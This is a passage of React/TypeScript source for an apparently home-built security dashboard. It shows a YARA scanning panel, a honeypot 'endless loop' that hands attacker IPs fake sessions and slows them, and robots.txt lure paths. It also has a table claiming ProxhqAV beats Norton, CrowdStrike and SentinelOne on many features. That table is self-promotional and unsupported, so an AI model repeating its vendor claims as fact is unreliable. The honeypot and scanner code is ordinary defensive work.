  const filteredRules = (rules??[]).filter(r =>
    !search || r.name.toLowerCase().includes(search.toLowerCase()) ||
    (r.malwareFamily??"").toLowerCase().includes(search.toLowerCase()) ||
    (r.tags??"").toLowerCase().includes(search.toLowerCase())
  );

  const MATCH_C: Record<string,string> = { MATCHED:"#ff6600", NO_MATCH:"#00ff88" };

  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      {/* YARA Scan */}
      <FwmCard>
        <SectionTitle icon={<Microscope size={12} color="#cc44ff"/>} title="YARA Pattern Scanner"/>
        <InfoBar text="Paste any file content, script, hex dump, or memory dump. ProxhqAV runs all YARA rules and returns every match with matched string patterns." color="#cc44ff"/>
        <div style={{ display:"flex", flexWrap:"wrap", gap:4, marginBottom:8 }}>
          <div style={{ fontSize:9, color:"#555", width:"100%", marginBottom:2 }}>Quick test payloads:</div>
          {yaraTest.map((t,i)=>(
            <button key={i} onClick={()=>setScanContent(t)} style={{ background:"#1a1a1a", border:"1px solid #2a2a2a", borderRadius:4, padding:"2px 7px", fontSize:8, fontFamily:"monospace", color:"#666", cursor:"pointer" }}>{t.substring(0,30)}...</button>
          ))}
        </div>
        <textarea value={scanContent} onChange={e=>setScanContent(e.target.value)} placeholder="Paste script, code, or content to scan with all YARA rules..." rows={8} style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"8px 10px", fontFamily:"monospace", fontSize:9, color:"#ccc", resize:"vertical", boxSizing:"border-box" }}/>
        <div style={{ marginTop:8 }}>
          <Btn2 onClick={runYaraScan} color="#cc44ff" disabled={scanning||!scanContent.trim()}>
            {scanning?"⟳ Scanning...":"▶ Run YARA Scan"}
          </Btn2>
        </div>
        {scanResult && (
          <div style={{ marginTop:10, background:scanResult.verdict==="MATCHED"?"#0f060a":"#050f05", border:`1px solid ${MATCH_C[scanResult.verdict]??"#333"}33`, borderRadius:8, padding:12 }}>
            <div style={{ display:"flex", gap:8, alignItems:"center", marginBottom:8 }}>
              <span style={{ fontSize:13, fontWeight:900, color:MATCH_C[scanResult.verdict]??"#aaa", fontFamily:"monospace" }}>{scanResult.verdict}</span>
              <Bdg label={`${scanResult.matches.length} rule matches`} color={scanResult.matches.length>0?"#ff6600":"#00ff88"} sm/>
              <span style={{ fontSize:9, color:"#444" }}>{scanResult.totalRulesChecked} rules checked</span>
            </div>
            {scanResult.matches.map((m,i)=>(
              <div key={i} style={{ background:"#111", borderRadius:6, padding:"7px 10px", marginBottom:5, borderLeft:`3px solid ${SEV_AV[m.severity]??"#333"}` }}>
                <div style={{ display:"flex", gap:6, alignItems:"center", marginBottom:3 }}>
                  <Bdg label={m.severity.toUpperCase()} color={SEV_AV[m.severity]??"#888"} sm/>
                  <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff", fontWeight:700 }}>{m.rule}</span>
                </div>
                <div style={{ fontSize:9, color:"#777" }}>{m.description.substring(0,100)}</div>
                <div style={{ marginTop:5, display:"flex", flexWrap:"wrap", gap:3 }}>
                  {m.matchedPatterns.slice(0,6).map((p,j)=>(
                    <code key={j} style={{ background:"#ff220011", border:"1px solid #ff220033", borderRadius:4, padding:"1px 6px", fontSize:8, color:"#ff6600" }}>{p.substring(0,40)}</code>
                  ))}
                </div>
              </div>
            ))}
          </div>
        )}
      </FwmCard>

      {/* YARA Rule Browser */}
      <FwmCard>
        <SectionTitle icon={<BookOpen size={12} color="#cc44ff"/>} title={`YARA Rule Library (${rules?.length??0} rules)`}
          extra={<input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search rules..." style={{ background:"#111", border:"1px solid #222", borderRadius:4, padding:"3px 8px", color:"#aaa", fontSize:9, fontFamily:"monospace", width:130 }}/>}
        />
        <div style={{ maxHeight:560, overflow:"auto" }}>
          {filteredRules.map(rule=>(
            <div key={rule.id} style={{ background:"#111", borderRadius:6, padding:"9px 12px", marginBottom:6, borderLeft:`3px solid ${SEV_AV[rule.severity]??"#333"}`, cursor:"pointer" }} onClick={()=>setExpanded(expanded===rule.id?null:rule.id)}>
              <div style={{ display:"flex", alignItems:"center", gap:6, marginBottom:3 }}>
                <Bdg label={rule.severity.toUpperCase()} color={SEV_AV[rule.severity]??"#888"} sm/>
                {rule.matchCount>0&&<Bdg label={`${rule.matchCount} matches`} color="#ff9900" sm/>}
                <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff", fontWeight:700 }}>{rule.name.replace("ProxhqAV_","")}</span>
              </div>
              <div style={{ fontSize:9, color:"#777" }}>{rule.description?.substring(0,80)}</div>
              {rule.malwareFamily&&<div style={{ fontSize:8, color:"#555", marginTop:2 }}>Family: {rule.malwareFamily}</div>}
              {rule.tags&&<div style={{ marginTop:4, display:"flex", flexWrap:"wrap", gap:2 }}>{rule.tags.split(",").slice(0,5).map(t=><Bdg key={t} label={t} color="#333" sm/>)}</div>}
              {expanded===rule.id&&(
                <div style={{ marginTop:8 }}>
                  <div style={{ background:"#050505", border:"1px solid #1a1a1a", borderRadius:6, padding:"8px 10px", fontFamily:"monospace", fontSize:8, color:"#00ff88", whiteSpace:"pre-wrap", maxHeight:300, overflow:"auto" }}>
                    {rule.ruleText}
                  </div>
                  <div style={{display:"flex",gap:4,marginTop:6}}>
                    <Btn2 onClick={async()=>{setScanContent(rule.ruleText.match(/\$\w+\s*=\s*"([^"]+)"/)?.[1]??scanContent); setExpanded(null);}} color="#cc44ff" sm>Test This Rule</Btn2>
                    <CopyBtn text={rule.ruleText}/>
                  </div>
                </div>
              )}
            </div>
          ))}
          {!loading&&filteredRules.length===0&&<div style={{color:"#333",fontFamily:"monospace",fontSize:11,padding:10}}>No rules — click "Seed Threat Intel" in the ProxhqAV Engine tab first</div>}
        </div>
      </FwmCard>

      {/* YARA Research Panel */}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<ShieldCheck size={12} color="#00ff88"/>} title="ProxhqAV vs. Commercial Antivirus — Feature Comparison"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:8 }}>
          {[
            {feature:"Hash Signature DB",      proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
            {feature:"YARA Rule Engine",        proxhq:true,  norton:false, crowdstrike:true,  sentinel:true},
            {feature:"LOLBin Detection",        proxhq:true,  norton:false, crowdstrike:true,  sentinel:true},
            {feature:"IOC Database (C2/IP)",    proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
            {feature:"Ransomware Ext. DB",      proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
            {feature:"Entropy Analysis",        proxhq:true,  norton:false, crowdstrike:true,  sentinel:true},
            {feature:"Process Injection Det.",  proxhq:true,  norton:false, crowdstrike:true,  sentinel:true},
            {feature:"Anti-Evasion Engine",     proxhq:true,  norton:false, crowdstrike:true,  sentinel:false},
            {feature:"Macro Dropper Detection", proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
            {feature:"VPN-Native Integration",  proxhq:true,  norton:false, crowdstrike:false, sentinel:false},
            {feature:"File Quarantine Engine",  proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
            {feature:"Memory Scan (YARA)",      proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},
            {feature:"Open Source Intel (OSINT)",proxhq:true, norton:false, crowdstrike:false, sentinel:false},
            {feature:"Rootkit Scanner",         proxhq:true,  norton:true,  crowdstrike:true,  sentinel:true},

            {feature:"Zero Trust Integration",  proxhq:true,  norton:false, crowdstrike:true,  sentinel:true},
          ].map(f=>(
            <div key={f.feature} style={{ background:"#111", borderRadius:6, padding:"8px 10px" }}>
              <div style={{ fontSize:9, color:"#aaa", marginBottom:6, fontWeight:700 }}>{f.feature}</div>
              {[{n:"ProxhqAV",v:f.proxhq,c:"#00ff88"},{n:"Norton",v:f.norton,c:"#ffaa00"},{n:"CrowdStrike",v:f.crowdstrike,c:"#4488ff"},{n:"SentinelOne",v:f.sentinel,c:"#cc44ff"}].map(av=>(
                <div key={av.n} style={{ display:"flex", justifyContent:"space-between", fontSize:8, marginBottom:2, color:av.v?av.c:"#333" }}>
                  <span>{av.n}</span><span>{av.v?"✓":"✗"}</span>
                </div>
              ))}
            </div>
          ))}
        </div>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── THREE-LAYER ENDLESS HONEYPOT LOOP ────────────────────────────────────────
// L1: Ghost Trap™ → L2: Labyrinth Engine™ → L3: Tar Pit Drain™ → L1 (forever)
// ════════════════════════════════════════════════════════════════════════════
type LoopStatus = {
  engine:{version:string;status:string;layers:number};
  stats:{activeSessions:number;totalSessions:number;uniqueAttackers:number;totalLoopCycles:number;totalTarpitMs:number;totalDrainMs:number;totalWastedMs:number;silkTrapped:number;autoBlocked:number;totalProbes:number;labyrinthVisits:number};
  layers:{layer1:{name:string;description:string;activeSessions:number;totalProbes:number};layer2:{name:string;description:string;activeSessions:number;totalNodeVisits:number};layer3:{name:string;description:string;activeSessions:number;activeConnections:number;totalDrainMs:number}};
  loopStages:Array<{stage:number;label:string;layer:number;tarpitMin:number;tarpitMax:number}>;
  recentSessions:LoopSession[];
};
type LoopSession = {id:number;sessionId:string;attackerIp:string;attackerPort:number|null;attackerUa:string|null;stage:number;stageLabel:string;loopCount:number;interactionCount:number;totalTarpitMs:number;triggerType:string;fakeSessionToken:string|null;fakeUsername:string|null;geoCountry:string|null;geoIsp:string|null;autoBlockScheduled:boolean;silkTrapped:boolean;isActive:boolean;lastSeenAt:string;createdAt:string;intelligenceJson:Record<string,unknown>|null;currentLayer:number;timeWastedFormatted:string};
type LabyrinthData = {nodes:Array<{id:string;label:string;type:string;fake:string;visitCount:number;uniqueAttackers:number;avgDelay:number}>;recentPaths:Array<{id:number;sessionId:string;attackerIp:string;pathNode:string;nodeType:string;fakeDataServed:unknown;delayMs:number;loopIteration:number;breadcrumb:string|null;visitedAt:string}>;totalVisits:number;uniqueAttackers:number};
type TarpitStatus = {config:{tarpitMinMs:number;tarpitMaxMs:number;autoBlockAfter:number};stages:Array<{name:string;delayMs:number;label:string;color:string}>;stats:{activeConnections:number;totalConnections:number;totalWastedMs:number;totalWastedFormatted:string;avgDelayMs:number;deadLoopCount:number;autoBlocked:number};connections:Array<{id:number;connectionId:string;attackerIp:string;drainStage:string;currentDelayMs:number;maxDelayMs:number;totalWastedMs:number;hitCount:number;isActive:boolean;autoBlocked:boolean;drainPercent:number;lastSeenAt:string;ghostIntelJson:Record<string,unknown>|null}>};
type LureUrls = {lureEndpoints:Array<{label:string;url:string;layer:number;layer_name:string}>;loopEndpoint:string;description:string};

const STAGE_LAYER_COLOR: Record<number,string> = { 1:"#00ff88", 2:"#cc44ff", 3:"#ff4444" };
const STAGE_COLORS: Record<string,string> = { initial_contact:"#00ff88", login_success:"#00cc66", admin_dashboard:"#cc44ff", database_access:"#aa22ff", server_creds:"#9900ff", deeper_access:"#ff6600", exfil_complete:"#ff2244", loop_reset:"#4488ff" };
const DRAIN_COLORS: Record<string,string> = { initial:"#ffaa00", slow:"#ff9900", crawl:"#ff6600", freeze:"#ff4444", dead_loop:"#ff2244" };

function LoopTrapTab() {
  const { data: status, loading, reload } = useFwm<LoopStatus>("/honeypot/loop-status");
  const { data: sessions } = useFwm<LoopSession[]>("/honeypot/loop-sessions");
  const [selected, setSelected] = useState<LoopSession | null>(null);
  const [triggerIp, setTriggerIp] = useState("");
  const [triggerType, setTriggerType] = useState("manual");
  const [triggering, setTriggering] = useState(false);
  const [trigResult, setTrigResult] = useState<{sessionId:string;fakeUser:string;fakeToken:string}|null>(null);
  const [showActiveOnly, setShowActiveOnly] = useState(false);

  const trigger = async () => {
    if (!triggerIp.trim()) return;
    setTriggering(true);
    const r = await fwmPost("/honeypot/loop-trigger", { ip:triggerIp, triggerType });
    setTrigResult(r as any); setTriggering(false); await reload();
  };

  const advance = async (sessionId: string) => {
    await fwmPost("/honeypot/loop-advance", { sessionId });
    await reload();
  };

  const terminate = async (sessionId: string) => {
    await fwmPost(`/honeypot/loop-session/${sessionId}`, {});
    await reload();
  };

  const displaySessions = (sessions ?? status?.recentSessions ?? []).filter(s => !showActiveOnly || s.isActive);

  const msToHuman = (ms: number) => {
    if (ms < 1000) return `${ms}ms`;
    if (ms < 60000) return `${(ms/1000).toFixed(1)}s`;
    if (ms < 3600000) return `${Math.floor(ms/60000)}m ${Math.floor((ms%60000)/1000)}s`;
    return `${Math.floor(ms/3600000)}h ${Math.floor((ms%3600000)/60000)}m`;
  };

  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      {/* Engine Status Overview */}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Infinity size={14} color="#00ff88"/>} title="Endless Loop Honeypot Engine™ — Three-Layer Active Deception" badge="ACTIVE" badgeColor="#00ff88"
          extra={<div style={{display:"flex",gap:6}}>
            <Bdg label={`${status?.stats.activeSessions??0} ACTIVE`} color="#00ff88"/>
            <Btn2 onClick={reload} color="#333" sm><RefreshCw size={10}/></Btn2>
          </div>}
        />
        <InfoBar text="Layer 1 (Ghost Trap™) fingerprints attacker → Layer 2 (Labyrinth Engine™) routes through infinite fake endpoints → Layer 3 (Tar Pit Drain™) exponentially slows responses → loops back to Layer 1 forever. Collects: IP · Geo · ISP · ASN · DNS · User-Agent · Hop Chain · Payloads · Session behavior." color="#00ff88"/>
        {/* Three-layer flow diagram */}
        <div style={{ display:"flex", alignItems:"center", gap:8, padding:"12px 0", marginBottom:10, overflowX:"auto" }}>
          {[
            { layer:1, name:"Ghost Trap™",      desc:"Fingerprint + Fake Login",     color:"#00ff88", icon:<ShieldCheck size={16}/>, stats:status?.layers.layer1 },
            null, // arrow
            { layer:2, name:"Labyrinth Engine™", desc:"Fake Dashboard Maze",          color:"#cc44ff", icon:<GitBranch size={16}/>, stats:status?.layers.layer2 },
            null,
            { layer:3, name:"Tar Pit Drain™",    desc:"Escalating Slow-Drain",       color:"#ff4444", icon:<Hourglass size={16}/>, stats:status?.layers.layer3 },
            null,
            { layer:0, name:"↩ Loop Reset",      desc:"Back to Ghost Trap (∞)",      color:"#4488ff", icon:<RotateCcw size={16}/>, stats:null },
          ].map((item, i) => {
            if (!item) return <ArrowRight key={i} size={18} color="#333"/>;
            return (
              <div key={i} style={{ flex:1, background:"#111", borderRadius:8, padding:"10px 12px", border:`1px solid ${item.color}33`, minWidth:120 }}>
                <div style={{ display:"flex", alignItems:"center", gap:6, marginBottom:4, color:item.color }}>{item.icon}<span style={{ fontWeight:700, fontSize:10, fontFamily:"monospace" }}>L{item.layer||"∞"}</span></div>
                <div style={{ fontSize:10, fontWeight:700, color:"#fff", marginBottom:2 }}>{item.name}</div>
                <div style={{ fontSize:8, color:"#555", marginBottom:4 }}>{item.desc}</div>
                {item.stats && "activeSessions" in item.stats && <div style={{ fontSize:8, color:item.color }}>{item.stats.activeSessions} active sessions</div>}
                {item.stats && "activeConnections" in item.stats && <div style={{ fontSize:8, color:item.color }}>{(item.stats as any).activeConnections} connections draining</div>}
              </div>
            );
          })}
        </div>
        {/* Stats bar */}
        <div style={{ display:"grid", gridTemplateColumns:"repeat(6,1fr)", gap:8 }}>
          {[
            {l:"Active Sessions", v:status?.stats.activeSessions??0, c:"#00ff88"},
            {l:"Total Trapped",   v:status?.stats.totalSessions??0,  c:"#fff"},
            {l:"Unique IPs",      v:status?.stats.uniqueAttackers??0, c:"#cc44ff"},
            {l:"Loop Cycles",     v:status?.stats.totalLoopCycles??0, c:"#ff9900"},
            {l:"Time Wasted",     v:msToHuman(status?.stats.totalWastedMs??0), c:"#ff4444"},
            {l:"Silk Trapped",    v:status?.stats.silkTrapped??0,     c:"#ff2244"},
          ].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#0a0a0a", borderRadius:6, padding:"8px 4px" }}>
              <div style={{ fontSize:16, fontWeight:800, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
              <div style={{ fontSize:8, color:"#444" }}>{s.l}</div>
            </div>
          ))}
        </div>
      </FwmCard>

      {/* Manual Loop Trigger */}
      <FwmCard>
        <SectionTitle icon={<Crosshair size={12} color="#ff6600"/>} title="Manual Loop Trigger — Initiate on Any IP"/>
        <InfoBar text="Manually lock any attacker IP into the endless loop. All three layers activate immediately — Ghost Trap issues a fake session, Labyrinth opens the maze, Tar Pit begins draining." color="#ff6600"/>
        <div style={{ display:"flex", flexDirection:"column", gap:6, marginBottom:10 }}>
          <input value={triggerIp} onChange={e=>setTriggerIp(e.target.value)} placeholder="Attacker IP address (e.g. 1.2.3.4)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"7px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <select value={triggerType} onChange={e=>setTriggerType(e.target.value)} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:10 }}>
            {["manual","waf","injection","xss","cmd","recon"].map(t=><option key={t}>{t}</option>)}
          </select>
          <Btn2 onClick={trigger} color="#ff6600" disabled={triggering||!triggerIp.trim()}>
            {triggering ? "⟳ Initiating..." : "⚡ Trigger Endless Loop"}
          </Btn2>
        </div>
        {trigResult && (
          <div style={{ background:"#0a050a", border:"1px solid #cc44ff33", borderRadius:8, padding:10, fontFamily:"monospace", fontSize:9 }}>
            <div style={{ color:"#00ff88", fontWeight:700, marginBottom:6 }}>✓ Loop Activated · Session: {trigResult.sessionId.slice(-12)}</div>
            <div style={{ color:"#555", marginBottom:2 }}>Fake user: <span style={{color:"#cc44ff"}}>{trigResult.fakeUser}</span></div>
            <div style={{ color:"#555", wordBreak:"break-all" }}>Fake token: <span style={{color:"#4488ff"}}>{trigResult.fakeToken?.slice(0,40)}...</span></div>
          </div>
        )}

        {/* Loop stage visualization */}
        <div style={{ marginTop:12 }}>
          <div style={{ fontSize:9, color:"#444", marginBottom:6, fontFamily:"monospace" }}>8-STAGE LOOP CYCLE (repeats ∞)</div>
          {(status?.loopStages ?? []).map(s => (
            <div key={s.stage} style={{ display:"flex", alignItems:"center", gap:8, padding:"4px 8px", marginBottom:3, background:"#111", borderRadius:5, borderLeft:`3px solid ${STAGE_LAYER_COLOR[s.layer]??"#333"}` }}>
              <span style={{ fontSize:8, color:STAGE_LAYER_COLOR[s.layer]??"#888", fontFamily:"monospace", width:14, textAlign:"center", fontWeight:700 }}>L{s.layer}</span>
              <span style={{ fontSize:8, color:"#aaa", fontFamily:"monospace", flex:1 }}>{s.label}</span>
              <span style={{ fontSize:7, color:"#444" }}>{s.tarpitMin}–{s.tarpitMax}ms delay</span>
            </div>
          ))}
        </div>
      </FwmCard>

      {/* Session Table */}
      <FwmCard>
        <SectionTitle icon={<CircleDot size={12} color="#00ff88"/>} title={`Active Sessions (${displaySessions.filter(s=>s.isActive).length} / ${displaySessions.length})`}
          extra={<div style={{display:"flex",gap:4}}>
            <Btn2 onClick={()=>setShowActiveOnly(!showActiveOnly)} color={showActiveOnly?"#00ff88":"#333"} sm>Active Only</Btn2>
            <Btn2 onClick={reload} color="#333" sm><RefreshCw size={10}/></Btn2>
          </div>}
        />
        <div style={{ maxHeight:450, overflow:"auto" }}>
          {displaySessions.slice(0,40).map(s=>(
            <div key={s.id} style={{ background:s.isActive?"#111":"#0a0a0a", borderRadius:6, padding:"8px 10px", marginBottom:4, borderLeft:`3px solid ${s.isActive?STAGE_LAYER_COLOR[s.currentLayer]??"#333":"#222"}`, cursor:"pointer" }} onClick={()=>setSelected(selected?.id===s.id?null:s)}>
              <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:3 }}>
                <div style={{ display:"flex", alignItems:"center", gap:6 }}>
                  <Bdg label={`L${s.currentLayer}`} color={STAGE_LAYER_COLOR[s.currentLayer]??"#888"} sm/>
                  <span style={{ fontFamily:"monospace", fontSize:10, color:"#fff", fontWeight:700 }}>{s.attackerIp}</span>
                  {s.geoCountry&&<Bdg label={s.geoCountry} color="#333" sm/>}
                  {s.silkTrapped&&<Bdg label="SILK" color="#cc44ff" sm/>}
                </div>
                <div style={{ display:"flex", gap:4 }}>
                  <Bdg label={`×${s.loopCount} loops`} color="#ff9900" sm/>
                  {s.isActive&&<Btn2 onClick={()=>advance(s.sessionId)} color="#4488ff" sm>Next Stage</Btn2>}
                  {s.isActive&&<Btn2 onClick={()=>terminate(s.sessionId)} color="#ff4444" sm>Kill</Btn2>}
                </div>
              </div>
              <div style={{ display:"flex", gap:6, alignItems:"center" }}>
                <Bdg label={s.stageLabel} color={STAGE_COLORS[s.stageLabel]??"#888"} sm/>
                <span style={{ fontSize:8, color:"#555" }}>Wasted: <span style={{color:"#ff6600"}}>{s.timeWastedFormatted}</span></span>
                <span style={{ fontSize:8, color:"#444" }}>{s.triggerType}</span>
              </div>
              {selected?.id===s.id && (
                <div style={{ marginTop:8, padding:"8px 10px", background:"#050505", borderRadius:6, fontSize:9, fontFamily:"monospace" }}>
                  <div style={{ color:"#555", marginBottom:3 }}>Session: <span style={{color:"#888"}}>{s.sessionId}</span></div>
                  {s.fakeUsername&&<div style={{ color:"#555", marginBottom:3 }}>Fake identity: <span style={{color:"#cc44ff"}}>{s.fakeUsername} (admin)</span></div>}
                  {s.geoIsp&&<div style={{ color:"#555", marginBottom:3 }}>ISP: <span style={{color:"#4488ff"}}>{s.geoIsp}</span></div>}
                  {s.attackerUa&&<div style={{ color:"#555", marginBottom:3 }}>UA: <span style={{color:"#aaa"}}>{s.attackerUa.substring(0,80)}</span></div>}
                  <div style={{ color:"#555" }}>Interactions: <span style={{color:"#ffaa00"}}>{s.interactionCount}</span> · Stage: {s.stage}/7</div>
                </div>
              )}
            </div>
          ))}
          {!loading && displaySessions.length === 0 && (
            <div style={{color:"#333",fontFamily:"monospace",fontSize:11,padding:10}}>No sessions yet — trigger a loop manually or wait for real attacker activity</div>
          )}
        </div>
      </FwmCard>

      {/* Lure URL Panel */}
      <LureUrlPanel/>
    </div>
  );
}

function LureUrlPanel() {
  const { data: lures } = useFwm<LureUrls>("/honeypot/lure-urls");
  const [copied, setCopied] = useState<string|null>(null);
  const copyUrl = (url: string) => { navigator.clipboard.writeText(url); setCopied(url); setTimeout(()=>setCopied(null),2000); };
  const L_COLOR: Record<number,string> = { 1:"#00ff88", 2:"#cc44ff", 3:"#ff4444" };

  return (
    <FwmCard style={{ gridColumn:"1/-1" }}>
      <SectionTitle icon={<ExternalLink size={12} color="#4488ff"/>} title="Honeypot Lure Bait URLs — Deploy These on Your Website or VPN Server"/>
      <InfoBar text="Place these URLs in robots.txt, HTML source comments, hidden form fields, or anywhere attackers scan. When they hit a lure URL, all three layers activate automatically — Ghost Trap fingerprints them, Labyrinth opens the maze, Tar Pit begins draining." color="#4488ff"/>
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr 1fr", gap:6 }}>
        {(lures?.lureEndpoints??[]).map(ep=>(
          <div key={ep.url} style={{ background:"#111", borderRadius:6, padding:"8px 10px", borderLeft:`3px solid ${L_COLOR[ep.layer]??"#333"}` }}>
            <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center", marginBottom:4 }}>
              <div style={{ display:"flex", gap:5, alignItems:"center" }}>
                <Bdg label={`L${ep.layer} ${ep.layer_name}`} color={L_COLOR[ep.layer]??"#888"} sm/>
                <span style={{ fontFamily:"monospace", fontSize:9, color:"#fff", fontWeight:700 }}>{ep.label}</span>
              </div>
              <button onClick={()=>copyUrl(ep.url)} style={{ background:"none", border:"none", cursor:"pointer", color:copied===ep.url?"#00ff88":"#444", padding:"0 2px" }}>
                {copied===ep.url?<Check size={10}/>:<Copy size={10}/>}
              </button>
            </div>
            <div style={{ fontSize:8, fontFamily:"monospace", color:"#555", wordBreak:"break-all" }}>{ep.url.replace("https://","")}</div>
          </div>
        ))}
      </div>
      <div style={{ marginTop:8, padding:"8px 12px", background:"#0a0a0a", borderRadius:6, fontSize:9, color:"#444" }}>
        <strong style={{color:"#4488ff"}}>robots.txt deployment:</strong> Add{" "}
        <code style={{color:"#00ff88"}}>Disallow: /admin{"\n"}Disallow: /phpmyadmin{"\n"}Disallow: /.env</code>{" "}
        — attackers scan disallowed paths first. They hit the lure, all layers activate.
      </div>
    </FwmCard>
  );
}

// ── Labyrinth Engine™ Tab ──────────────────────────────────────────────────────
function LabyrinthTab() {
  const { data: labyrinth, loading, reload } = useFwm<LabyrinthData>("/honeypot/labyrinth-map");
  const { data: labSessions } = useFwm<Array<{sessionId:string;attackerIp:string;nodeCount:number;nodesVisited:string[];totalDelay:number;firstVisit:string;lastVisit:string}>>("/honeypot/labyrinth-sessions");
  const [selectedNode, setSelectedNode] = useState<string|null>(null);

  const TYPE_COLOR: Record<string,string> = { login:"#00ff88", dashboard:"#cc44ff", api:"#4488ff", db:"#ffaa00", config:"#ff6600", files:"#ff9900", creds:"#ff4444", ssh:"#ff2244", exfil:"#9900ff", reset:"#4488ff", trap:"#ff2244" };
  const NODE_ICONS: Record<string,string> = { login:"🔑", dashboard:"📊", api:"🔌", db:"🗄️", config:"⚙️", files:"📁", creds:"🔐", ssh:"🖥️", exfil:"💾", reset:"🔄", trap:"🪤" };

  const msToHuman = (ms: number) => ms < 1000 ? `${ms}ms` : ms < 60000 ? `${(ms/1000).toFixed(1)}s` : `${Math.floor(ms/60000)}m ${Math.floor((ms%60000)/1000)}s`;

  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      {/* Labyrinth overview */}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<GitBranch size={14} color="#cc44ff"/>} title="Labyrinth Maze Engine™ — Infinite Fake Endpoint Network" badge="Layer 2" badgeColor="#cc44ff"
          extra={<Btn2 onClick={reload} color="#333" sm><RefreshCw size={10}/></Btn2>}
        />
        <InfoBar text="Attackers entering Layer 2 are routed through an infinite network of fake endpoints. Every endpoint looks real, returns convincing data, and records everything the attacker does. When they reach the 'data export', they loop back to the login screen — forever." color="#cc44ff"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:8, marginBottom:12 }}>
          {[
            {l:"Total Node Visits", v:labyrinth?.totalVisits??0,       c:"#cc44ff"},
            {l:"Unique Attackers",  v:labyrinth?.uniqueAttackers??0,   c:"#fff"},
            {l:"Active Sessions",   v:labSessions?.length??0,          c:"#00ff88"},
          ].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"10px 4px" }}>
              <div style={{ fontSize:20, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v.toLocaleString()}</div>
              <div style={{ fontSize:8, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>

        {/* Labyrinth node map */}
        <div style={{ fontSize:9, color:"#444", marginBottom:6, fontFamily:"monospace" }}>FAKE ENDPOINT MAZE — attackers navigate between these nodes in sequence</div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(5,1fr)", gap:6 }}>
          {(labyrinth?.nodes??[]).map((node, i) => (
            <div key={node.id} style={{ background:selectedNode===node.id?"#1a0a2a":"#111", borderRadius:8, padding:"10px 8px", border:`1px solid ${selectedNode===node.id?"#cc44ff44":TYPE_COLOR[node.type]+"22"}`, cursor:"pointer", position:"relative" }}
              onClick={()=>setSelectedNode(selectedNode===node.id?null:node.id)}>
              {i < (labyrinth?.nodes.length??0) - 1 && (
                <div style={{ position:"absolute", right:-14, top:"50%", transform:"translateY(-50%)", color:"#333", fontSize:10 }}>→</div>
              )}
              <div style={{ fontSize:16, marginBottom:4 }}>{NODE_ICONS[node.type]??"🔗"}</div>
              <div style={{ fontSize:8, fontWeight:700, color:TYPE_COLOR[node.type]??"#888", marginBottom:2 }}>{node.label.replace("Fake ","")}</div>
              <div style={{ fontSize:7, color:"#444", marginBottom:4 }}>{node.fake.substring(0,45)}</div>
              <div style={{ display:"flex", gap:4 }}>
                <Bdg label={`${node.visitCount} visits`} color={node.visitCount>0?"#cc44ff":"#333"} sm/>
                {node.uniqueAttackers>0&&<Bdg label={`${node.uniqueAttackers} IPs`} color="#4488ff" sm/>}
              </div>
            </div>
          ))}
        </div>

        {selectedNode && (
          <div style={{ marginTop:10, padding:"10px 14px", background:"#0a050a", border:"1px solid #cc44ff33", borderRadius:8 }}>
            {(labyrinth?.nodes??[]).filter(n=>n.id===selectedNode).map(node=>(
              <div key={node.id}>
                <div style={{ fontWeight:700, color:"#cc44ff", fontFamily:"monospace", marginBottom:4 }}>{node.label}</div>
                <div style={{ fontSize:9, color:"#777", marginBottom:4 }}>{node.fake}</div>
                <div style={{ display:"flex", gap:8 }}>
                  <span style={{ fontSize:9, color:"#555" }}>Visits: <span style={{color:"#cc44ff"}}>{node.visitCount}</span></span>
                  <span style={{ fontSize:9, color:"#555" }}>IPs: <span style={{color:"#4488ff"}}>{node.uniqueAttackers}</span></span>
                  <span style={{ fontSize:9, color:"#555" }}>Avg delay: <span style={{color:"#ff9900"}}>{msToHuman(node.avgDelay)}</span></span>
                </div>
              </div>
            ))}
          </div>
        )}
      </FwmCard>

      {/* Recent traversals */}
      <FwmCard>
        <SectionTitle icon={<MousePointerClick size={12} color="#cc44ff"/>} title="Recent Attacker Maze Traversals"/>
        <div style={{ maxHeight:400, overflow:"auto" }}>
          {(labyrinth?.recentPaths??[]).slice(0,40).map(path=>(
            <div key={path.id} style={{ padding:"6px 10px", borderRadius:5, marginBottom:3, background:"#111", borderLeft:`3px solid ${TYPE_COLOR[path.nodeType]??"#333"}` }}>
              <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center" }}>
                <div style={{ display:"flex", gap:5, alignItems:"center" }}>
                  <span style={{ fontSize:9 }}>{NODE_ICONS[path.nodeType]??"🔗"}</span>
